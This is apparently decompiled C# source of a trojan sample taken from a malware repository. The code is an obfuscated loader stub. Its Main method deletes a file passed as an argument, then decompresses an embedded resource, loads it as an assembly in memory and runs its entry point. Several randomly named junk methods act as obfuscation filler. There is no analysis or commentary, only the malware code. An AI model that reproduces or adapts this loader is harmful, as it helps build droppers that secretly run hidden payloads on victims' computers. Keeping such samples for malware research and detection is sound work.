// Decompiled with JetBrains decompiler
// Type: mDHrnWAXHl
// Assembly: tmp4AD4.tmp, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 546DCBBF-3CD5-4241-AFD4-3CEDFD957653
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.Win32.Generic-70404169aa9d4a16f0b0bb0ffdd2c3cec0ba8a289bf12be0b6eaeacf9a5b8046.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;

[StandardModule]
public sealed class mDHrnWAXHl
{
  public static string WpvVV00(string bIZxH0, string zLaAa0, string chOjG0)
  {
    string[] strArray1 = new string[5]
    {
      "WpvVV0",
      nameof (bIZxH0),
      nameof (zLaAa0),
      nameof (chOjG0),
      "bOGAV0"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], bIZxH0, false) != 0)
    {
      zLaAa0 = chOjG0 + bIZxH0;
      if (chOjG0.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (chOjG0.Length - 1));
        while (zLaAa0.Length == 2)
        {
          if (bIZxH0.Contains(strArray1[1]))
            return bIZxH0;
        }
      }
    }
    return bIZxH0;
  }

  public static string ZGkzq11(string umOvr1, string NNBeF1, string XwkLK1)
  {
    string[] strArray1 = new string[5]
    {
      "ZGkzq1",
      nameof (umOvr1),
      nameof (NNBeF1),
      nameof (XwkLK1),
      "iBqLj1"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], umOvr1, false) != 0)
    {
      NNBeF1 = XwkLK1 + umOvr1;
      if (XwkLK1.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (XwkLK1.Length - 1));
        while (NNBeF1.Length == 2)
        {
          if (umOvr1.Contains(strArray1[1]))
            return umOvr1;
        }
      }
    }
    return umOvr1;
  }

  [STAThread]
  public static void Main(string[] args)
  {
    if (args.Length <= 0)
    {
      qFfABsLpVq.XhGIRGyxJR();
    }
    else
    {
      try
      {
        File.Delete(args[0]);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    Assembly.Load(mDHrnWAXHl.Deflate_D((byte[]) new ResourceManager("zCom", Assembly.GetExecutingAssembly()).GetObject("file"))).EntryPoint.Invoke((object) null, (object[]) null);
  }

  public static byte[] Deflate_D(byte[] DataZ)
  {
    byte[] numArray;
    try
    {
      numArray = mDHrnWAXHl.getStreamBytesX((Stream) new DeflateStream((Stream) new MemoryStream(DataZ), CompressionMode.Decompress, true), DataZ.Length);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return numArray;
  }

  public static byte[] getStreamBytesX(Stream dataStr, int dataChunks)
  {
    int offset = 0;
    byte[] streamBytesX;
    try
    {
      byte[] numArray;
      while (true)
      {
        numArray = (byte[]) Utils.CopyArray((Array) numArray, (Array) new byte[checked (offset + dataChunks + 1)]);
        int num = dataStr.Read(numArray, offset, dataChunks);
        if (num != 0)
          checked { offset += num; }
        else
          break;
      }
      streamBytesX = (byte[]) Utils.CopyArray((Array) numArray, (Array) new byte[checked (offset - 1 + 1)]);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      streamBytesX = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return streamBytesX;
  }

  public static string ftCol00(string wwHHh0, string nSfId0, string AegeM0)
  {
    string[] strArray1 = new string[5]
    {
      "ftCol0",
      nameof (wwHHh0),
      nameof (nSfId0),
      nameof (AegeM0),
      "ZspUh0"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], wwHHh0, false) != 0)
    {
      nSfId0 = AegeM0 + wwHHh0;
      if (AegeM0.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (AegeM0.Length - 1));
        while (nSfId0.Length == 2)
        {
          if (wwHHh0.Contains(strArray1[1]))
            return wwHHh0;
        }
      }
    }
    return wwHHh0;
  }

  public static string yERDp11(string KxAjv1, string JNGzg1, string hflrV1)
  {
    string[] strArray1 = new string[5]
    {
      "yERDp1",
      nameof (KxAjv1),
      nameof (JNGzg1),
      nameof (hflrV1),
      "rOoXa1"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], KxAjv1, false) != 0)
    {
      JNGzg1 = hflrV1 + KxAjv1;
      if (hflrV1.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (hflrV1.Length - 1));
        while (JNGzg1.Length == 2)
        {
          if (KxAjv1.Contains(strArray1[1]))
            return KxAjv1;
        }
      }
    }
    return KxAjv1;
  }
}
